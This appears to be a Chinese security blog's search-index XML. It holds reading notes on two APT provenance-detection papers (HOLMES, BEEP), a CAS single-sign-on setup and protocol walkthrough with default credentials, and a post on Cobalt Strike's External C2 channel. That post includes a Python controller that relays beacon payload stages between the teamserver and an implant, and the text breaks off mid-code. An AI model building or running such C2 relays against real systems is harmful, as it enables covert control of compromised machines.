<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>APT溯源图构建-论文阅读第一篇-HOLMES: Real-time APT Detection through Correlation of Suspicious Information Flows</title>
    <url>/2024/10/05/APT%E6%BA%AF%E6%BA%90%E5%9B%BE%E6%9E%84%E5%BB%BA-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%AC%E4%B8%80%E7%AF%87-HOLMES-Real-time-APT-Detection-through-Correlation-of-Suspicious-Information-Flows/</url>
    <content><![CDATA[<p>本系列记录一些关于APT溯源构建provenance graph的论文阅读笔记。旨在学习论文中的一些idea。</p>
<h2 id="Overview">Overview</h2>
<p>这篇论文亮点是引入一个中间层把低维度的审计日志（通常它他们是各个程序的syscall日志），映射到高纬度的APT kill chain信息。</p>
<p>高纬度kill chain</p>
<p><img src="image1.png" alt=""></p>
<p>引入中间层TTPs, HSG</p>
<p><img src="image2.png" alt=""></p>
<p>此外还引入了一些剪枝的策略</p>
<ol>
<li>We show how this concept can help to assess the strength of dependencies between HSG nodes. Weak dependencies can then be pruned away to eliminate many false alarms.</li>
<li>Second, we develop noise reduction techniques that further de-emphasize dependencies that are known to be associated with benign activities.</li>
<li>Third, we develop ranking and prioritization techniques to prune away most nodes and edges unrelated to the APT campaign.</li>
</ol>
<h2 id="TTPs-Tactics-Techniques-and-Procedure-的构建">TTPs(Tactics, Techniques and Procedure)的构建</h2>
<p>from Audit Logs，会引入一些规则，比如下面这个例子。</p>
<p><img src="image3.png" alt=""></p>
<p>会引入一些规则，比如有监控到read的系统调用，从非信任IP读取数据，那么就把它记做一个Unstrusted_Read(S, P)对。S是socket, P是进程。</p>
<p>如果有一个P, 他申请了可执行的内存，并且这个P和Unstrusted_Read(S, P’)中的P’有关系（path_factor）那么，就把这个P加入Make_Mem_Exec(P,M)对中。</p>
<p>注：path_factor怎么算后面会讲。</p>
<p>上面的两个Make_Mem_Exec和Make_Mem_Exec会被归为高纬度，对应APT kill chain的Initial_Compromoise。</p>
<h2 id="HSG-high-level-scenario-graph-的构建">HSG(high-level scenario graph)的构建</h2>
<p>这部分其实很简单，每一个TTP是一个小节点，节点之前是否连线就是他们是否有prerequisites里面的关系。</p>
<p>ATP Stage是一个大节点。</p>
<p><img src="image4.png" alt=""></p>
<h2 id="HSG剪枝技术">HSG剪枝技术</h2>
<h3 id="Avoiding-Spurious-Dependencies">Avoiding Spurious Dependencies</h3>
<p>这里引入了弱关联和强关联的概念，比如下图的中nginx error.log。cat和nginx就是弱关联，可能黑客通过nginx入侵过程中产生了一些日志，然后被管理员用cat读到了。</p>
<p><img src="image5.png" alt=""></p>
<p>所以作者在这里形式化的引入一个ancestral cover AC(f)，它是由<code>∀p ∈ f ∃a ∈ AC(f) a = p or a is an ancestor of p</code> 所定义。</p>
<p>一个信息流f的每一个p，把这个p和它的祖先进程都加入一个集合，这个集合就是AC(f)。接着引入一个ACmin(f)的概念代表size最小的AC(f)。</p>
<p>注：这里类似于一个最大公约数的概念，如果nginx和cat由一个共同的祖先进程那么ACmin(f)就是1。显然这里nginx和cat并没有，所以ACmin(f)就是2。</p>
<p>因为一个node1到另一个node2可能有多条路径，f1, …, fn。每一个，路径都会有一个ACmin(f)，而这些ACmin(f)中最小的那个值就是上面path_factor想表达的东西。</p>
<p>path_factor(N1, N2) = minimum AC(f) of per path。</p>
<p>评论：看下来就是判断两个进程是否有共同的祖先，不知道为什么要搞得这么复杂。</p>
<h3 id="Noise-reduction-based-on-benign-prerequisites">Noise reduction based on benign prerequisites.</h3>
<p>作者认为一些长时间运行的良性进程可能也会触发TTP的规则，所以他会预先观察程序在良性环境情况触发TTPs的情况然后加成规则排除他们。</p>
<p>但是这样其实又会引入漏报，比如万一真的nginx在启动时会读/etc/passwd，然后他被当白样本学习了，造成黑客真的打进来的时候被忽略。</p>
<p>所以作者又提出，可以根据从/etc/passwd读出的大小来判断 -&gt; 读一次时正常，老是读就不正常了。</p>
<p>评论：感觉这就是一个笨办法，需要一个进程case by case的优化。</p>
<h3 id="Signal-Correlation-and-Detection">Signal Correlation and Detection</h3>
<p>因为kill chain有7步，所以会根据每一步最大的那个risk level，放进元组&lt;S1, S2, S3, …, S7&gt;</p>
<p><img src="image6.png" alt=""></p>
<p>然后根据这个元组算出一个分。</p>
<p><img src="image7.png" alt=""></p>
<p>基于两个主要标准设计的：(1) 灵活性和定制化，以及 (2) 随着步骤展开，APT步骤的相关性反映在分数的放大上。</p>
<p><img src="image8.png" alt=""></p>
<p>评论：这一步看起来还挺科学的</p>
<h2 id="完整的TTPs">完整的TTPs</h2>
<p><img src="image9.png" alt=""></p>
]]></content>
      <categories>
        <category>redteam</category>
      </categories>
      <tags>
        <tag>paper reading</tag>
        <tag>redteam</tag>
      </tags>
  </entry>
  <entry>
    <title>APT溯源图构建-论文阅读第二篇-BEEP-High Accuracy Attack Provenance via Binary-based Execution Partition</title>
    <url>/2024/10/09/APT%E6%BA%AF%E6%BA%90%E5%9B%BE%E6%9E%84%E5%BB%BA-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%AC%E4%BA%8C%E7%AF%87-BEEP-High-Accuracy-Attack-Provenance-via-Binary-based-Execution-Partition/</url>
    <content><![CDATA[<h2 id="Overview">Overview</h2>
<p>这篇文章是19年的时候作者觉得现在基于syscall的日志粒度太粗糙了，可能引起路径爆炸的问题，所以提出了一个unit的概念用来精细化。</p>
<p>为什么粗糙？</p>
<p>其实只要是一些长时间跑的程序会有，比如浏览器，比如email软件。</p>
<p><img src="image1.png" alt=""></p>
<p>比如一天一个人会收到无数封邮件，其中有一封是钓鱼邮件，这个受害者使用Pine（一个文本基的电子邮件客户端）触发firefox打开钓鱼邮件里面恶意链接之后，中了木马。</p>
<p>因为邮件程序和firefox程序都是在长时间运行，所以一旦出了问题难以溯源，究竟是哪一封邮件，触发哪一个钓鱼IP导致的问题。</p>
<h2 id="Existing-Heuristics-method">Existing Heuristics method</h2>
<p>一些现有的解决这个问题的方法是</p>
<ol>
<li>使用时间戳来关联到近似的精准的因果关系 -&gt; 显然者并不是一个优雅的方法</li>
<li>既然一个程序（进程）粒度太粗了那就切分到线程级别来做 -&gt; 但是一些程序是用线程池的，仍然会造成因果混乱。</li>
<li>从file segment的角度关联，只有读了同一个文件指定segment才关联到一起。-&gt; 显然也不优雅，如果两个不相关的进程恰好整体读了文件，也会有错误因果关系。</li>
</ol>
<h2 id="Insight">Insight</h2>
<p>作者观察到这种长时间运行的程序都会有loop的特征。所以作者把每一次循环都看作是一个unit，然后关联unit之间的关系。做到细粒度的关联。</p>
<p>并且作者观察到这种loop特征的长时间运行程序基本都是事件驱动类型的。</p>
<p>作者把他们分成了三种pattern</p>
<ol>
<li>Single-process 比如W3M</li>
<li>Multiprocess 比如SSH直接fork一个新进程。</li>
<li>multi-threaded, respectively 比如apache http server, 两个线程，一个线程“生产”，一个线程“消费”</li>
</ol>
<p><img src="image2.png" alt=""></p>
<ol>
<li>每一次循环可以看成一个独立的子执行一个unit</li>
<li>子进程没有loop，所以子进程看成一个unit</li>
<li>把生产者的一次循环和对应触发的消费者的那一次循环看成两个unit</li>
</ol>
<p>如3这种比较复杂的需要找到unit之间的依赖关系，如果这种loop是被系统事件驱动很好找，因为监控系统调用就行了比如socket/file。</p>
<p>但是对于一些不是由系统event触发的loop，就需要考察是enqueue和dequeue进行插桩关联。</p>
<h2 id="识别unit">识别unit</h2>
<p>作者先是放弃了静态分析的方法，因为静态分析总是不精确的（参考莱斯定理哈哈）。</p>
<p>首先作者总结了包含unit的loop的特征</p>
<ol>
<li>这样的loop一般会倾向于出现在顶层</li>
<li>这样的loop一般会有一个syscall产生输入后或者输出</li>
</ol>
<p>但是这个特征并不精确，作者观察到有一些init和finailize的逻辑也会在顶层循环中，并且他发现在第二级loop中的逻辑才是我们想要找的unit。比如他们研究pine的时候发现的例子。</p>
<p><img src="image3.png" alt=""></p>
<p><img src="image4.png" alt=""></p>
<p>所以为了容忍这种情况，作者用tranning的方法对top level和second level的loop进行排查。</p>
<p>这个trainning的具体做法是</p>
<blockquote>
<p>In the training phase, our technique first constructs control flow graphs and call graphs for subject binaries using PEBIL [21], to identify loop heads and exits. Then we perform dynamic instrumentation using PIN [23] to log the beginning and ending of each iteration of all loops and system calls. We analyze the generated training log to filter out those loops that nest too deep or do not involve input/output syscalls.</p>
</blockquote>
<p>然后作者在后面说他把细节省略，但是我其实挺想看这些工程化细节的。。。</p>
<p><img src="image5.png" alt=""></p>
<p>这三列就是作者分别识别出来的，这程序总共有多少个loop，第一二季有多少loop，包含syscall有多少loop</p>
<h2 id="关联unit">关联unit</h2>
<p>捕获单元间的依赖关系对于隔离由多个单元构成的语义独立子执行是非常重要的。</p>
<p>这里基本思路是改进版的访问同一块内存。作者这里定义了两种类型的unit依赖</p>
<ul>
<li>Low Level Dependence：比如一些日志或者内存的管理，或者一个程序要通过更新全局变量的方式向另一个方报告自己的状态etc。这些东西可能导致最终把所有的unit都关联起来。</li>
<li>Workflow Dependence：这两个unit有明确的工作流关系</li>
</ul>
<p><img src="image6.png" alt=""></p>
<p>比如这里实线是Workflow Dependence，Low Level Dependence是虚线由update(log_buf)导致。</p>
<p>所以作者这里又加两个规则（为了拿到workflow dependence）</p>
<ol>
<li>两个有workflow dependence关系unit共享heap object的变量，而不是全局变量或者栈变量</li>
<li>来自同一个loop的unit都会有不同对象比如socket_A，socket_b，socket_c，但是像log_buf都是大家都有。</li>
</ol>
<p>作者下面给了一个算法来自动化的寻找unit</p>
<ol>
<li>We instrument libc memory allocation functions to detect all heap objects and their sizes.</li>
<li>We instrument all memory accesses to check if an access targets on any of the allocated heap objects. If so, we log the access.</li>
<li>We instrument all the unit loops identified in the previous phase to log the begin and the end of a unit. Essentially, we log each instance of a unit loop head. The execution between two consecutive instances of the loop head denotes a unit.</li>
<li>We then associate all the heap objects to the units in which they are accessed. For a heap access instruction inside a unit loop, if it accesses unique heap objects in different units and these objects cause inter-unit dependences, we consider it a unit dependence inducing instruction.* In other words, if an instruction ever accesses the same heap object in multiple units, it is excluded; if the object accessed by an instruction can never cause cross-unit dependence, it is excluded.*</li>
</ol>
<p><img src="image7.png" alt=""></p>
<p>在这个例子中算法会排除0x1,0x10 etc,因为他们在多个unit中都用到了，而0x10001只被两个unit共享所以会被看成有workflow dependence。0x20001同理。</p>
<p>后面作者又优化了一下这种算法，因为他发现我在两个有workflow dependence的unit里面，比如unit1-1 unit2-1</p>
<p>unit1-1写入0x50000, 0x50010。然后unit2-1读取0x50000, 0x50010。他们都会建立两次关系，但其实可能只是读了一个结构体的不同field，作者觉得unit1-1的写和unit2-1的读总是对称的。所以只选第一个field建立一次关系。</p>
<p>评论：但是我不懂作者是如何做到这一点的，怎么判断是不是同一个结构体的field？通过插桩的记录的chunk起始地址和大小？</p>
<p>后面还有一些其他的内容，比如作者提到动态测试覆盖不全可能会miss loop，或者上面规则不够完备还是可能关联上low level的dependence进来，最后还给了建立provence的算法。不过我觉得精华都在unit在这部分。</p>
]]></content>
      <categories>
        <category>redteam</category>
      </categories>
      <tags>
        <tag>paper reading</tag>
        <tag>redteam</tag>
      </tags>
  </entry>
  <entry>
    <title>CAS的搭建及认证流程分析与比较</title>
    <url>/2020/01/31/CAS%E7%9A%84%E6%90%AD%E5%BB%BA%E5%8F%8A%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[<!-- more -->
<h2 id="CAS-简介">CAS 简介</h2>
<p>CAS是一个单点登录（Single Sign On,简称SSO，SSO使得在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统）框架，开始是由耶鲁大学的一个组织开发，后来归到apereo去管。</p>
<h2 id="CAS-Server搭建">CAS Server搭建</h2>
<p>在此下载：<a href="https://github.com/apereo/cas/tree/4.1.x">https://github.com/apereo/cas/tree/4.1.x</a><br>
通常来说用mvn编译cas-server-webapp后放到tomcat中就行，但是cas默认需要走https，否则在登陆流程和跳转webapp流程中会出现如下两种报错。<br>
<img src="1580368543216-ba5d0a82-fc02-4225-9a7c-cc0c168f604b.png#align=left&amp;display=inline&amp;height=287&amp;name=image.png&amp;originHeight=574&amp;originWidth=2072&amp;size=171406&amp;status=done&amp;style=none&amp;width=1036" alt="image.png"></p>
<p><img src="1580368461615-7a24430e-9bf3-4689-9c3b-e9168d2d177d.png#align=left&amp;display=inline&amp;height=330&amp;name=image.png&amp;originHeight=660&amp;originWidth=2114&amp;size=175710&amp;status=done&amp;style=none&amp;width=1057" alt="image.png"></p>
<p>第一种解决办法是生成一个自签名的ssl证书并在tomcat的server.xml中配置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">keytool -genkey -<span class="built_in">alias</span> tomcat -keyalg RSA -keystore /path/to/my/keystore</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">&quot;8443&quot;</span> <span class="attr">protocol</span>=<span class="string">&quot;org.apache.coyote.http11.Http11NioProtocol&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">maxThreads</span>=<span class="string">&quot;150&quot;</span> <span class="attr">SSLEnabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">scheme</span>=<span class="string">&quot;https&quot;</span> <span class="attr">secure</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">keystoreFile</span>=<span class="string">&quot;$&#123;user.home&#125;/.keystore&quot;</span> <span class="attr">keystorePass</span>=<span class="string">&quot;p@assw0rd&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">clientAuth</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sslProtocol</span>=<span class="string">&quot;TLS&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>但是这种方法影响wireshark后续抓包分析，并且默认情况下CAS要求webapp也是https。</p>
<p>第二种办法是修改cas配置使其允许http。有下面四步。</p>
<ol>
<li>
<p>在<code>p:httpClient-ref=&quot;supportsTrustStoreSslSocketFactoryHttpClient&quot;</code>后增加<code>p:requireSecure=&quot;false&quot;</code><img src="1580377596613-3c72dd9e-f517-473f-9eea-e8a86e5e0d16.png#align=left&amp;display=inline&amp;height=103&amp;name=image.png&amp;originHeight=206&amp;originWidth=2182&amp;size=60740&amp;status=done&amp;style=none&amp;width=1091" alt="image.png"></p>
</li>
<li>
<p>修改WEB-INF/spring-configuration/ticketGrantingTicketCookieGenerator.xml<img src="1580377875413-89e3960e-4e30-435c-930b-7f720762d0a1.png#align=left&amp;display=inline&amp;height=135&amp;name=image.png&amp;originHeight=270&amp;originWidth=2218&amp;size=71387&amp;status=done&amp;style=none&amp;width=1109" alt="image.png"></p>
</li>
<li>
<p>修改WEB-INF/spring-configuration/warnCookieGenerator.xml<img src="1580377924581-fc1351cc-d72d-4f50-abe3-217a43230b80.png#align=left&amp;display=inline&amp;height=137&amp;name=image.png&amp;originHeight=274&amp;originWidth=2064&amp;size=61824&amp;status=done&amp;style=none&amp;width=1032" alt="image.png"></p>
</li>
<li>
<p>修改注册服务WEB-INF/classes/services/HTTPSandIMAPS-10000001.json将<code>&quot;serviceId&quot; : &quot;^(https|imaps)://.*&quot;</code>修改为<code>&quot;serviceId&quot; : &quot;^(https|http|imaps)://.*&quot;</code><img src="1580377987989-7a8526d8-9459-4ac3-bf96-66f71578f201.png#align=left&amp;display=inline&amp;height=66&amp;name=image.png&amp;originHeight=120&amp;originWidth=1318&amp;size=22754&amp;status=done&amp;style=none&amp;width=720" alt="image.png"></p>
</li>
</ol>
<p>修改重启后虽然前端还是会爆错，但是其实正常登陆了。默认的帐密是casuser/Mellon，记录在deployerConfigContext.xml中。<br>
<img src="1580356310308-00f8b236-b1d6-43bd-a1d2-a729df5cbf65.png#align=left&amp;display=inline&amp;height=516&amp;name=image.png&amp;originHeight=1032&amp;originWidth=3030&amp;size=386108&amp;status=done&amp;style=none&amp;width=1515" alt="image.png"><br>
<img src="1580378152394-9517eb31-cb68-4d15-a187-2868a1f7277a.png#align=left&amp;display=inline&amp;height=607&amp;name=image.png&amp;originHeight=1214&amp;originWidth=2150&amp;size=275338&amp;status=done&amp;style=none&amp;width=1075" alt="image.png"></p>
<p><img src="1580378176954-6713c06c-70af-4ac3-9f5c-b0e34fcf8e19.png#align=left&amp;display=inline&amp;height=493&amp;name=image.png&amp;originHeight=986&amp;originWidth=2330&amp;size=226505&amp;status=done&amp;style=none&amp;width=1165" alt="image.png"></p>
<h2 id="Webapp搭建">Webapp搭建</h2>
<p>在此下载：<a href="https://github.com/UniconLabs/cas-sample-java-webapp">https://github.com/UniconLabs/cas-sample-java-webapp</a><br>
修改web.xml中casServerLoginUrl、casServerUrlPrefix、serverName值。casServerLoginUrl对应cas server地址（如果来客没有登陆过webapp就会把来客重定向到这里进行cas统一认证），casServerUrlPrefix对应cas server地址（这个值后续会跟一些api路径做拼接），serverName是webapp地址。<br>
<img src="1580380855855-5bfed017-f240-4af9-a5e7-0555444cb000.png#align=left&amp;display=inline&amp;height=485&amp;name=image.png&amp;originHeight=970&amp;originWidth=2062&amp;size=158930&amp;status=done&amp;style=none&amp;width=1031" alt="image.png"></p>
<h2 id="认证流程分析">认证流程分析</h2>
<p>环境ip说明<br>
cas server：172.16.247.1<br>
cas webapp：172.16.247.139<br>
用户：172.16.247.131</p>
<ul>
<li>user访问webapp，因为之前从未登陆过webapp，所以webapp会把user重定向给cas进行统一登陆（重定向的url的serivce中带有webapp自己的url好让cas知道user登陆成功后该重定向回哪里）。<img src="1580383571657-a271c09d-0890-442f-b3f6-6a172f235f53.png#align=left&amp;display=inline&amp;height=243&amp;name=image.png&amp;originHeight=486&amp;originWidth=1854&amp;size=118852&amp;status=done&amp;style=none&amp;width=927" alt="image.png"></li>
<li>user在cas登陆，登陆成功后cas会给user带一个cookie（TGC也叫TGT，如果之后要登陆其他webapp就不用重复输入密码而是直接给ST了）和一个ST（在location url中）的302回webapp。<img src="1580383821801-70d72983-d348-48c3-8a07-c770ec082c77.png#align=left&amp;display=inline&amp;height=262&amp;name=image.png&amp;originHeight=524&amp;originWidth=2476&amp;size=231885&amp;status=done&amp;style=none&amp;width=1238" alt="image.png"></li>
<li>webapp拿到user请求过来的ST会向CAS的api发送已验证ST的合法性，如果cas验证成功会发送给CAS的是成功的状态信息和用户的一些数据。<img src="1580384247485-354438d9-9482-4450-8b26-01ada6bd18c4.png#align=left&amp;display=inline&amp;height=147&amp;name=image.png&amp;originHeight=294&amp;originWidth=2190&amp;size=82873&amp;status=done&amp;style=none&amp;width=1095" alt="image.png"><br>
<img src="1580384287803-1b5da7b9-c455-4ae4-9557-47a1629d157e.png#align=left&amp;display=inline&amp;height=678&amp;name=image.png&amp;originHeight=1356&amp;originWidth=2142&amp;size=177667&amp;status=done&amp;style=none&amp;width=1071" alt="image.png"></li>
<li>webapp从cas那里得知ST是有效的，给user设置cookie（用户之后就不必再走一次这个流程了）。并让用户成功登陆。<img src="1580384354171-e57ad4ab-a595-442d-968f-44eef905f385.png#align=left&amp;display=inline&amp;height=103&amp;name=image.png&amp;originHeight=206&amp;originWidth=1736&amp;size=59328&amp;status=done&amp;style=none&amp;width=868" alt="image.png"></li>
</ul>
<p>一图胜千言，图片来自网络（侵删）。</p>
<p><img src="1580374514900-55ff9aef-070f-4dc4-9da7-e2a70721372a.png#align=left&amp;display=inline&amp;height=672&amp;name=image.png&amp;originHeight=1344&amp;originWidth=1630&amp;size=652092&amp;status=done&amp;style=none&amp;width=815" alt="image.png"></p>
<h2 id="SSO-vs-Kerberos-vs-OAuth">SSO vs Kerberos vs OAuth</h2>
<p>当时看完整个cas的认证流程感觉里面一些要素和kerberos和OAuth认证很相似（都有一个第三方来进行认证/授权）。因此相比较一下这三者的区别。</p>
<h3 id="SSO-vs-Kerberos">SSO vs Kerberos</h3>
<p>sso和kerberos和共同点在他们都一个用TGT换ST的过程，不同点在于kerberos中其实有四个角色（client，KDC-AS，KDC-TS，server）并且因为“相近”的两个之间预先共享密钥，所以server不需要发送请求向KDC求证ST的真实性，但是CAS中server需要向cas server求证真实性。</p>
<h3 id="SSO-vs-OAuth">SSO vs OAuth</h3>
<p>它俩之前最大的不同的在业务场景的不同，SSO用在一个公司内部员工的单点登陆。OAuth用在两个公司之前A公司获取其用户在B公司的一些数据。OAuth还常常涉及到啊AB两公司的帐号绑定，所以需要state来防止csrf，这个是SSO里面没有的。</p>
<h2 id="杂">杂</h2>
<p>编译整个cas的遇到org.samba.jcifs:jcifs-ext:0.9.4无法下载的问题，选择手动下载jar并安装到本地maven仓库中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载地址：http://maven.yonyoucloud.com/nexus/content/groups/public/org/samba/jcifs/jcifs-ext/0.9.4/</span></span><br><span class="line">mvn install:install-file -DgroupId=org.samba.jcifs -DartifactId=jcifs-ext -Dversion=0.9.4 -Dpackaging=jar -Dfile=/Users/cengsiqi/Downloads/jcifs-ext-0.9.4.jar</span><br></pre></td></tr></table></figure>
<h2 id="参考">参考</h2>
<p><a href="https://blog.csdn.net/chenhai201/article/details/50623395">cas 4.1.4单点登录实战</a><br>
<a href="https://blog.51cto.com/fengwan/1876603">CAS 4.1.10关闭HTTPS</a><br>
<a href="https://blog.csdn.net/GaoXiR/article/details/99539501">使用maven命令安装jar包到本地maven仓库</a><br>
<a href="https://blog.csdn.net/mahoking/article/details/42319475">Spring P标签的使用</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike External C2信道</title>
    <url>/2019/10/25/CobaltStrike%20External%20C2%E4%BF%A1%E9%81%93/</url>
    <content><![CDATA[<!-- CS的扩展C2接口（Cobalt Strike External Command and Control）可以允许第三方程序作为teamserver和Beacon之间的一个额外通信层。以下简称External C2。 -->
<!-- more -->
<h2 id="简介">简介</h2>
<p>CS的扩展C2接口（Cobalt	Strike	External Command	and	Control）可以允许第三方程序作为teamserver和Beacon之间的一个额外通信层。以下简称External C2。</p>
<h2 id="架构">架构</h2>
<p>External C2由一个第三方控制器和第三方客户端组成。架构示意图如下。<br>
<img src="./20180402112536-822a7264-3625-1.png" alt="Alt text"></p>
<p>说白了就是一个代理转发的功能。</p>
<p>第三方控制器负责连接上CS的External C2服务、转发External C2服务提供的payload stage、转发攻击者下达的任务、Beeacon会话的相应等。</p>
<p>第三方服务端负责注入payload stage到内存、读取Beacon Session的相应，下达服务端传达的任务给Beacon session。</p>
<h2 id="External-C2协议">External C2协议</h2>
<h3 id="数据帧">数据帧</h3>
<p>External C2和SMB Beacon使用相同格式的数据帧（即External C2接收和发送的帧，SMB Beacon接受和发送的帧都是一样的）。所有帧都以4字节的小端字节顺序整数开始，此整数是帧内数据的长度。后面紧跟帧内数据。</p>
<p><img src="./20180402112536-8237df76-3625-1.png" alt="Alt text"></p>
<h3 id="未授权">未授权</h3>
<p>External C2不会对向它连接的第三方控制器进行鉴权，这听上很不合理，但事实它的本质就是一个listener。</p>
<h2 id="External-C2组件">External C2组件</h2>
<h3 id="External-C2-Server">External C2 Server</h3>
<p>使用AS脚本进行启动，启动命令是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">externalc2_start(&quot;0.0.0.0&quot;, 2222);</span><br></pre></td></tr></table></figure>
<h3 id="第三方控制器">第三方控制器</h3>
<p>当需要新会话时，第三方控制器连接到External C2。 与External C2的每个连接视作一个会话服务。</p>
<p>第三方控制器连接上External C2的第一个任务是发送需要的配置信息。它包括架构信息arch，命名管道pipename，回连间隔时间block。External C2不会ack这些消息，当配置完成后发送go指令，以告诉External C2发送payload stage</p>
<p>第三方控制器读取到payload stage并转发给第三方客户端，此时，第三方控制器必须等待从第三方客户端接收帧。 当此帧到来时，第三方控制器必须将帧写入到它对External C2 Server的连接（socket）。</p>
<p>第三方控制器现在必须从External C2 Server读取一个帧。 External C2 Server将等待配置的block时间再发送任务。 如果没有任何可用任务，External C2 Server将生成一个空任务的帧。 第三方控制器必须将其读取的帧发送给第三方客户端。</p>
<p>第三方控制器会一直重复<strong>等待-&gt;从一方读取-&gt;转发到另一方-&gt;等待</strong>的过程。</p>
<h3 id="第三方客户端">第三方客户端</h3>
<p>第三方客户端将接受第三方控制器第一步发来的payload stage。这个payload stage是一个因头部被patch可以自启动的DLL。正常的进程注入可以运行这段代码。</p>
<p>一旦payload stage跑起来了，第三方客户端可以连接便可以连接到命名管道服务器。第三方代理将像文件一样以读写方式打开命名管道。打开命名管道的路径是<code>\\.\pipe\[pipe name here]</code>。如果第三方客户端的语言有操作命名管道的API也可以使用。</p>
<p>第三方客户端现在必须从Beacon命名管道连接中读取一个帧。 读取此帧后，第三方客户端必须将此帧中继到第三方控制器进行处理。</p>
<p>第三方客户端现在必须等待来自第三方控制器的帧。 一旦此帧可用，第三方客户端必须将此帧写入命名管道连接。</p>
<p>第三方客户端也会一直重复<strong>等待-&gt;从一方读取-&gt;转发到另一方-&gt;等待</strong>的过程。</p>
<h2 id="Demo代码">Demo代码</h2>
<p>控制端</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExternalC2Controller</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, port</span>):</span><br><span class="line">        <span class="variable language_">self</span>.port = port</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encodeFrame</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="built_in">len</span>(data)) + data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sendToTS</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="variable language_">self</span>._socketTS.sendall(<span class="variable language_">self</span>.encodeFrame(data))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recvFromTS</span>(<span class="params">self</span>):</span><br><span class="line">        data = <span class="string">&quot;&quot;</span></span><br><span class="line">        _<span class="built_in">len</span> =  <span class="variable language_">self</span>._socketTS.recv(<span class="number">4</span>)</span><br><span class="line">        l = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>,_<span class="built_in">len</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(data) &lt; l:</span><br><span class="line">            data += <span class="variable language_">self</span>._socketTS.recv(l - <span class="built_in">len</span>(data))</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sendToBeacon</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="variable language_">self</span>._socketClient.sendall(<span class="variable language_">self</span>.encodeFrame(data))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">recvFromBeacon</span>(<span class="params">self</span>):</span><br><span class="line">        data = <span class="string">&quot;&quot;</span></span><br><span class="line">        _<span class="built_in">len</span> =  <span class="variable language_">self</span>._socketClient.recv(<span class="number">4</span>)</span><br><span class="line">        l = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>,_<span class="built_in">len</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(data) &lt; l:</span><br><span class="line">            data += <span class="variable language_">self</span>._socketClient.recv(l - <span class="built_in">len</span>(data))</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># First thing, wait for a connection from our custom beacon</span></span><br><span class="line">        <span class="variable language_">self</span>._socketBeacon = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">        <span class="variable language_">self</span>._socketBeacon.bind((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8081</span>))</span><br><span class="line">        <span class="variable language_">self</span>._socketBeacon.listen(<span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>._socketClient = <span class="variable language_">self</span>._socketBeacon.accept()[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Received C2 connection&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Now we have a beacon connection, we kick off comms with CS External C2</span></span><br><span class="line">        <span class="variable language_">self</span>._socketTS = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)</span><br><span class="line">        <span class="variable language_">self</span>._socketTS.connect((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="variable language_">self</span>.port))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Send out config options</span></span><br><span class="line">        <span class="variable language_">self</span>.sendToTS(<span class="string">&quot;arch=x86&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.sendToTS(<span class="string">&quot;pipename=xpntest&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.sendToTS(<span class="string">&quot;block=500&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.sendToTS(<span class="string">&quot;go&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Receive the beacon payload from CS to forward to our custom beacon</span></span><br><span class="line">        data = <span class="variable language_">self</span>.recvFromTS()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">            <span 